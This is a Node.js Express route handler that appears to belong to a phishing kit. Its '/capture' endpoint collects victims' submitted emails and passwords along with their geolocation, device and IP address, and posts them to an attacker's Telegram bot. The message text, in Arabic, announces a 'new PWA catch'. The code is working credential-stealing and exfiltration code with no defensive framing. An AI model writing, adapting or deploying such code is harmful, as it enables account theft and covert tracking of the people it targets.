app.post('/capture', async (req, res) => {
    const { email, password, location, device } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "رفض الموقع";
    const text = `🔥 صيد PWA جديد!\n📧 إيميل: ${email}\n🔑 باسورد: ${password}\n📍 خريطة: ${mapUrl}\n📱 جهاز: ${device}\n🌐 IP: ${ip}`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text
    });

    res.status(200).send("OK");
});
